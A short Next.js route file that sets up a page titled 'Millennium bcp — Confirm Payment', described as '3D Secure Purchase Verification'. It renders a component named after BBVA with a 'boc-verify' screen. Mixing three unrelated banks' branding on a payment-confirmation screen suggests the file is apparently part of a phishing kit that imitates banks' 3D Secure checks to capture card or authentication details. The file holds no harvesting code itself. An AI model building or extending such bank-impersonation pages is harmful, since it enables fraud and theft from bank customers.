import BbvaPage from "../page"

export const metadata = {
  title: "Millennium bcp — Confirm Payment",
  description: "3D Secure Purchase Verification",
}

export default function BocVerifyRoutePage() {
  return <BbvaPage initialScreen="boc-verify" />
}
